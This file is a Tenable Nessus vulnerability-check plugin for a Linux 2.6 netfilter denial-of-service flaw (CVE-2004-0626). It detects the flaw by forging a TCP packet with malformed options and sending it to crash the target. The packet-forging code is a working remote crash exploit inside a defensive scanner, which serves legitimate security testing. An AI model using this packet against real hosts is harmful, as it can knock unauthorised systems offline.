#
# (C) Tenable Network Security, Inc.
#

#
# Ref:
# From: Adam Osuchowski <adwol-AT-polsl.gliwice.pl>
# To: bugtraq-AT-securityfocus.com
# Subject: Remote DoS vulnerability in Linux kernel 2.6.x
# Date: Wed, 30 Jun 2004 12:57:17 +0200
#



include("compat.inc");

if (description)
{
 script_id(12296);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2004-0626");
 script_bugtraq_id(10634);
 script_xref(name:"OSVDB", value:"7316");

 script_name(english:"Linux 2.6 Netfilter TCP Option Matching DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote host by sending a specially
malformed TCP/IP packet with invalid TCP options.  Only version 2.6 of
the Linux kernel is known to be affected by this problem.  An attacker
may use this flaw to disable this host remotely." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/367615/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9ba1bace" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Linux 2.6.8 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_summary(english:"Crashes the remote host");
 script_category(ACT_KILL_HOST);
 script_require_keys("Settings/ParanoidReport");
 script_family(english:"Denial of Service");
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 exit(0);
}



include('global_settings.inc');

if ( report_paranoia < 2 ) exit(0);
if ( TARGET_IS_IPV6 ) exit(0);
if ( islocalhost() ) exit(0);


port = get_host_open_port();
if ( ! port ) port = 22;

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0,ip_off:0,ip_len:20,
                         ip_p:IPPROTO_TCP, ip_id:rand() % 65535, ip_ttl:0x40,
                         ip_src:this_host());


tcpip = forge_tcp_packet(    ip       : ip,
                             th_sport : rand() % 64000 + 1024,
                             th_dport : port,
                             th_flags : 0,
                             th_seq   : rand() % 65535,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 7,
                             th_win   : 512,
                             th_urp   : 0,
                             data     : raw_string(0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0xfd) );


start_denial();
for ( i = 0 ; i < 5 ; i ++ ) send_packet ( tcpip, pcap_active:FALSE ) ;

alive = end_denial();
if ( ! alive )
{
 security_warning(0);
 set_kb_item(name:"Host/dead", value:TRUE);
}

